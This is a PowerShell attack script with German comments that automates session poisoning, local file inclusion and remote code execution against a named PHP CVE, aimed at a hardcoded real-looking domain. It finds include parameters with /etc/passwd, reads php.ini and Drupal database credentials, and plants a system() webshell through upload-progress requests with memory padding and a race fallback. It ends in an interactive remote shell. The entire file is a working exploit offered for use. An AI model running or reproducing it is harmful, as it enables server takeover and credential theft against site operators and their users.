#Requires -Version 5.1
<#
  ufcw_lfi_runner.ps1
  Session-Poison -> LFI -> RCE gegen CVE-2026-109618 (mod_php, php serialize handler)
  Ablauf: Param-Discovery, save_path/memory_limit aus php.ini, strict_mode-Check,
          upload_progress-Poison, OOM-Tuning, Verifikation, Trigger, Shell.
  Alles automatisch. Log liegt neben dem Skript.
#>
[CmdletBinding()]
param(
    [string] $Base    = 'https://ufcw464a.org/',
    [string] $SessId  = 'p2sedbe7a80524e4903',
    [string] $Cmd     = 'id',
    [string] $Payload = '<?php echo "PWN:";system($_GET["c"]);?>',
    [int]    $Timeout = 25,
    [switch] $NoShell
)

$ErrorActionPreference = 'Stop'
$ProgressPreference    = 'SilentlyContinue'
try { [Net.ServicePointManager]::SecurityProtocol = 'Tls12,Tls11,Tls' } catch {}
try { [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true } } catch {}

$Log = Join-Path (Get-Location) ("ufcw_lfi_{0}.log" -f (Get-Date -Format 'yyyyMMdd_HHmmss'))
function Log([string]$m, [string]$c = 'Gray') {
    $line = "[{0}] {1}" -f (Get-Date -Format 'HH:mm:ss'), $m
    Write-Host $line -ForegroundColor $c
    Add-Content -LiteralPath $Log -Value $line -Encoding UTF8
}
function Head([string]$m) { Log ''; Log ("=" * 72) 'DarkCyan'; Log $m 'Cyan'; Log ("=" * 72) 'DarkCyan' }

# ---------------------------------------------------------------- HTTP-Kern
function Invoke-Target {
    param([string]$Url, [hashtable]$Headers, [byte[]]$Body, [string]$ContentType)
    $p = @{ Uri = $Url; UseBasicParsing = $true; TimeoutSec = $Timeout; MaximumRedirection = 0; ErrorAction = 'Stop' }
    if ($Body)    { $p.Body = $Body; $p.Method = 'POST'; $p.ContentType = $ContentType }
    if ($Headers) { $p.Headers = $Headers }
    $sw = [Diagnostics.Stopwatch]::StartNew()
    try {
        $r = Invoke-WebRequest @p; $sw.Stop()
        return [pscustomobject]@{ Code = [int]$r.StatusCode; Body = [string]$r.Content; Ms = $sw.ElapsedMilliseconds; Hdr = $r.Headers }
    } catch {
        $sw.Stop(); $code = 0; $body = ''
        $resp = $_.Exception.Response
        if ($resp) {
            try { $code = [int]$resp.StatusCode } catch {}
            try { $body = (New-Object IO.StreamReader($resp.GetResponseStream())).ReadToEnd() } catch {}
        }
        return [pscustomobject]@{ Code = $code; Body = $body; Ms = $sw.ElapsedMilliseconds; Hdr = $null }
    }
}
function Write-Str([IO.MemoryStream]$ms, [string]$s) {
    $b = [Text.Encoding]::UTF8.GetBytes($s); $ms.Write($b, 0, $b.Length)
}
function New-Multipart {
    param([string]$Progress, [int]$Pad)
    $bnd = '----ps' + [Guid]::NewGuid().ToString('N')
    $ms  = New-Object IO.MemoryStream
    Write-Str $ms ("--$bnd`r`nContent-Disposition: form-data; name=`"PHP_SESSION_UPLOAD_PROGRESS`"`r`n`r`n$Progress`r`n")
    if ($Pad -gt 0) {
        Write-Str $ms ("--$bnd`r`nContent-Disposition: form-data; name=`"pad`"`r`n`r`n")
        $chunk = [Text.Encoding]::ASCII.GetBytes(('A' * 65536))
        $left = $Pad
        while ($left -gt 0) { $n = [Math]::Min($left, 65536); $ms.Write($chunk, 0, $n); $left -= $n }
        Write-Str $ms "`r`n"
    }
    Write-Str $ms ("--$bnd`r`nContent-Disposition: form-data; name=`"f`"; filename=`"a.txt`"`r`nContent-Type: text/plain`r`n`r`nX`r`n--$bnd--`r`n")
    return @{ Bytes = $ms.ToArray(); Type = "multipart/form-data; boundary=$bnd" }
}
function Longest-B64([string]$s) {
    $best = ''
    foreach ($m in [regex]::Matches($s, '[A-Za-z0-9+/=\s]{24,}')) {
        $v = ($m.Value -replace '\s', '')
        if ($v.Length -gt $best.Length) { $best = $v }
    }
    return $best
}
# Liest eine Datei über einen Include-Parameter; bevorzugt php://filter (binaersicher).
function Get-Lfi {
    param([string]$Param, [string]$Path)
    $u = "$Base`?$Param=php://filter/convert.base64-encode/resource=$Path"
    $r = Invoke-Target -Url $u
    if ($r.Code -ne 200 -or -not $r.Body) { return $null }
    $b64 = Longest-B64 $r.Body
    if (-not $b64) { return $null }
    try { return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64)) } catch { return $null }
}
function Get-Include {
    param([string]$Param, [string]$Path, [string]$Extra = '')
    return Invoke-Target -Url ("$Base`?$Param=$Path$Extra")
}

# ---------------------------------------------------------------- 0 Baseline
Head '0 - Erreichbarkeit und Baseline'
$r0 = Invoke-Target -Url $Base
Log ("GET / -> HTTP {0}, {1} ms, {2} Bytes" -f $r0.Code, $r0.Ms, $r0.Body.Length)
if ($r0.Code -eq 0) { Log 'Host nicht erreichbar - Abbruch.' 'Red'; return }
$hdr = $r0.Hdr
if ($hdr) {
    foreach ($k in 'Server','X-Powered-By','Set-Cookie') {
        if ($hdr[$k]) { Log ("Header {0}: {1}" -f $k, $hdr[$k]) 'DarkGray' }
    }
}
$baseline = $r0.Body.Length
Log ("Baseline-Body: {0} Bytes" -f $baseline) 'DarkGray'

# ---------------------------------------------------------------- 1 Param-Discovery
Head '1 - Include-Parameter ermitteln (Content-basiert)'
$candidates = @('file','q','lang','page','view','inc','path','template','dir','url','src','include','load','doc')
$Param = $null; $Mode = $null
foreach ($p in $candidates) {
    $plain = Invoke-Target -Url ("$Base`?$p=/etc/passwd")
    $filt  = Invoke-Target -Url ("$Base`?$p=php://filter/convert.base64-encode/resource=/etc/passwd")
    $isPlain = $plain.Body -match 'root:x:0:0'
    $dec = $null
    if ($filt.Body) { $b = Longest-B64 $filt.Body; if ($b) { try { $dec = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) } catch {} } }
    $isFilt = $dec -match 'root:x:0:0'
    $tag = ''
    if ($isPlain) { $tag = 'PLAIN-HIT'; $Mode = 'plain' }
    elseif ($isFilt) { $tag = 'FILTER-HIT'; $Mode = 'filter' }
    else { $tag = 'nein' }
    Log ("  {0,-10} {1,4}B {2,4}ms  {3}" -f $p, $plain.Body.Length, $plain.Ms, $tag) $(if($tag -match 'HIT'){'Green'}else{'DarkGray'})
    if ($tag -match 'HIT' -and -not $Param) { $Param = $p; if ($isPlain) { $Mode = 'plain' } }
    Start-Sleep -Milliseconds 150
}
if (-not $Param) { Log 'Kein Include-Parameter gefunden. Abbruch - Hinweise im Log pruefen.' 'Red'; return }
Log ("Parameter: '{0}' (Modus {1})" -f $Param, $Mode) 'Green'
# Include-Ausfuehrung testen: liefert der Parameter bei /etc/passwd Klartext statt Quelltext?
$execTest = Get-Include -Param $Param -Path '/etc/passwd'
$isInclude = $execTest.Body -match 'root:x:0:0'
Log ("Parameter includet: {0}" -f $isInclude) $(if($isInclude){'Green'}else{'Yellow'})
if (-not $isInclude) { Log 'Parameter liest nur - Payload-Ausfuehrung wird nicht klappen, Kette trotzdem weiter.' 'Yellow' }

# ---------------------------------------------------------------- 2 php.ini
Head '2 - Konfiguration auslesen'
$iniPaths = @(
    '/etc/php/7.3/apache2/php.ini','/etc/php/7.3/cli/php.ini','/etc/php/7.3/fpm/php.ini',
    '/etc/php.ini','/usr/local/etc/php/php.ini','/etc/php/apache2/php.ini'
)
$ini = $null; $iniPath = $null
foreach ($ip in $iniPaths) {
    $c = Get-Lfi -Param $Param -Path $ip
    if ($c -and $c -match 'memory_limit') { $ini = $c; $iniPath = $ip; break }
    Start-Sleep -Milliseconds 120
}
$SavePath = $null; $MemLimit = 0
if ($ini) {
    Log ("php.ini: {0}" -f $iniPath) 'Green'
    $m = [regex]::Match($ini, '(?m)^\s*session\.save_path\s*=\s*"?([^"\r\n]+)"?')
    if ($m.Success) { $SavePath = $m.Groups[1].Value.Trim(); Log ("session.save_path = {0}" -f $SavePath) 'Green' }
    $m = [regex]::Match($ini, '(?m)^\s*memory_limit\s*=\s*"?(\d+)([KMG]?)')
    if ($m.Success) {
        $n = [int64]$m.Groups[1].Value
        switch ($m.Groups[2].Value.ToUpper()) { 'K'{$n*=1024} 'M'{$n*=1048576} 'G'{$n*=1073741824} }
        $MemLimit = $n; Log ("memory_limit = {0} Bytes" -f $MemLimit) 'Green'
    }
    foreach ($k in 'session.use_strict_mode','session.upload_progress.enabled','session.upload_progress.cleanup','session.serialize_handler','allow_url_include') {
        $mm = [regex]::Match($ini, "(?m)^\s*$([regex]::Escape($k))\s*=\s*(\S+)")
        if ($mm.Success) { Log ("{0} = {1}" -f $k, $mm.Groups[1].Value) 'DarkGray' }
    }
    # Bonus: Drupal settings.php
    $st = Get-Lfi -Param $Param -Path '/sites/default/settings.php'
    if (-not $st) { $st = Get-Lfi -Param $Param -Path '/var/www/html/sites/default/settings.php' }
    if ($st -and $st -match 'database') {
        Log 'Drupal settings.php lesbar - DB-Zugang:' 'Green'
        foreach ($mm in [regex]::Matches($st, "(?m)^\s*'(database|username|password|host)'\s*=>\s*'([^']*)'")) {
            Log ("   {0} = {1}" -f $mm.Groups[1].Value, $mm.Groups[2].Value) 'DarkGray'
        }
        Add-Content -LiteralPath $Log -Value $st -Encoding UTF8
    }
} else {
    Log 'php.ini nicht lesbar - Standardwerte werden angenommen.' 'Yellow'
}
if (-not $SavePath) { $SavePath = '/var/lib/php/sessions' }
if ($MemLimit -le 0) { $MemLimit = 262144; Log 'memory_limit unbekannt -> 262144 aus Report.' 'Yellow' }

# ---------------------------------------------------------------- 3 Session
Head '3 - Session und strict_mode'
$sessCandidates = @(
    (Join-Path $SavePath "sess_$SessId"),
    "/var/lib/php/sessions/sess_$SessId", "/var/lib/php/session/sess_$SessId",
    "/tmp/sess_$SessId", "/tmp/php_sessions/sess_$SessId"
) | Select-Object -Unique
$SessFile = $null
foreach ($sf in $sessCandidates) {
    $c = Get-Lfi -Param $Param -Path $sf
    if ($c -ne $null) { $SessFile = $sf; Log ("Session-Datei lesbar: {0} ({1} Bytes)" -f $sf, $c.Length) 'Green'; break }
    Start-Sleep -Milliseconds 150
}
$Cookie = @{ Cookie = "PHPSESSID=$SessId" }
$rc = Invoke-Target -Url $Base -Headers $Cookie
$sc = $null; if ($rc.Hdr) { $sc = [string]$rc.Hdr['Set-Cookie'] }
$Strict = ($sc -and $sc -notmatch [regex]::Escape($SessId))
Log ("strict_mode aktiv: {0}" -f $Strict) $(if($Strict){'Yellow'}else{'Green'})
if ($Strict) {
    if ($sc -match 'PHPSESSID=([^;]+)') { $SessId = $Matches[1]; $Cookie = @{ Cookie = "PHPSESSID=$SessId" } }
    Log ("Neue Session-ID uebernommen: {0}" -f $SessId) 'Yellow'
    $SessFile = $null
    foreach ($sf in $sessCandidates) {
        $c = Get-Lfi -Param $Param -Path $sf
        if ($c -ne $null) { $SessFile = $sf; Log ("Session-Datei: {0}" -f $sf) 'Green'; break }
        Start-Sleep -Milliseconds 150
    }
}
if (-not $SessFile) {
    $SessFile = Join-Path $SavePath "sess_$SessId"
    Log ("Keine Session-Datei bestaetigt - nehme {0} an." -f $SessFile) 'Yellow'
}

# ---------------------------------------------------------------- 4 Poison + OOM
Head '4 - Poison mit OOM-Tuning'
$sizes = @(
    ($MemLimit - 16384), ($MemLimit - 8192), $MemLimit, ($MemLimit + 8192),
    ($MemLimit + 32768), ($MemLimit + 65536), ($MemLimit + 131072), ($MemLimit * 2)
) | Where-Object { $_ -gt 0 } | Select-Object -Unique
$Poisoned = $false; $UsedSize = 0
foreach ($s in $sizes) {
    $mp = New-Multipart -Progress $Payload -Pad $s
    $r = Invoke-Target -Url $Base -Headers $Cookie -Body $mp.Bytes -ContentType $mp.Type
    Start-Sleep -Milliseconds 500
    $chk = Get-Include -Param $Param -Path $SessFile
    $hit  = $chk.Body -match 'PWN:'
    $kept = $chk.Body -match 'upload_progress_'
    Log ("  pad {0,8} -> HTTP {1,4} {2,5}ms | Datei: {3}" -f $s, $r.Code, $r.Ms, $(if($hit){'PAYLOAD EXEC'}elseif($kept){'Daten liegen'}else{'leer'})) $(if($hit){'Green'}elseif($kept){'Yellow'}else{'DarkGray'})
    if ($hit -or $kept) { $Poisoned = $true; $UsedSize = $s; break }
    Start-Sleep -Milliseconds 400
}
if (-not $Poisoned) {
    Log 'Kein OOM-Fenster getroffen. Fallback: Race mit parallelem Trigger.' 'Yellow'
    $job = Start-Job -ScriptBlock {
        param($u, $h, $p, $pl, $ct)
        $o = New-Object IO.MemoryStream
        $b = [Text.Encoding]::UTF8.GetBytes($pl)
        for ($i = 0; $i -lt 2000; $i++) {
            try {
                $o = New-Object IO.MemoryStream
                $w = { param($s) $x = [Text.Encoding]::UTF8.GetBytes($s); $o.Write($x,0,$x.Length) }
                & $w "--B`r`nContent-Disposition: form-data; name=`"PHP_SESSION_UPLOAD_PROGRESS`"`r`n`r`n$pl`r`n"
                & $w "--B`r`nContent-Disposition: form-data; name=`"pad`"`r`n`r`n$('A' * 300000)`r`n--B--`r`n"
                Invoke-WebRequest -Uri $u -Method Post -Headers $h -Body $o.ToArray() -ContentType 'multipart/form-data; boundary=B' -UseBasicParsing -TimeoutSec 20 | Out-Null
            } catch {}
        }
    } -ArgumentList $Base, $Cookie, $Param, $Payload, 'multipart/form-data; boundary=B'
    for ($i = 1; $i -le 120; $i++) {
        $t = Get-Include -Param $Param -Path $SessFile -Extra '&c=id'
        if ($t.Body -match 'uid=') { Log 'Treffer im Race!' 'Green'; $Poisoned = $true; break }
        Start-Sleep -Milliseconds 250
    }
    Stop-Job $job -ErrorAction SilentlyContinue; Remove-Job $job -Force -ErrorAction SilentlyContinue
}
if (-not $Poisoned) { Log 'Poison fehlgeschlagen. Log pruefen: save_path, cleanup, strict_mode, Rechte.' 'Red'; return }

# ---------------------------------------------------------------- 5 Trigger
Head '5 - Trigger'
$esc = [Uri]::EscapeDataString($Cmd)
$out = $null
for ($i = 1; $i -le 40; $i++) {
    $t = Get-Include -Param $Param -Path $SessFile -Extra "&c=$esc"
    if ($t.Body -match 'PWN:([\s\S]{0,4000}?)(?:<br|\z|<\/)') { $out = $Matches[1].Trim(); break }
    if ($t.Body -match 'PWN:(.*)') { $out = $Matches[1].Trim(); break }
    Start-Sleep -Milliseconds 250
}
if ($out) { Log 'RCE bestaetigt:' 'Green'; Write-Host $out -ForegroundColor White }
else { Log 'Trigger lieferte keinen Output - Datei ggf. von cleanup geleert, Schritt 4 wiederholen.' 'Red' }

# ---------------------------------------------------------------- 6 Shell
if (-not $NoShell -and $out) {
    Head '6 - Shell (leer = Ende)'
    while ($true) {
        $c = Read-Host 'ps> '
        if ([string]::IsNullOrWhiteSpace($c)) { break }
        $t = Get-Include -Param $Param -Path $SessFile -Extra ("&c=" + [Uri]::EscapeDataString($c))
        if ($t.Body -match 'PWN:(.*)') { Write-Host $Matches[1].Trim() -ForegroundColor White } else { Write-Host $t.Body.Substring(0, [Math]::Min(300, $t.Body.Length)) -ForegroundColor DarkGray }
    }
}
Head ("Fertig. Log: {0}" -f $Log)
Log ("Parameter={0}  Session={1}  Datei={2}  Pad={3}" -f $Param, $SessId, $SessFile, $UsedSize) 'Cyan'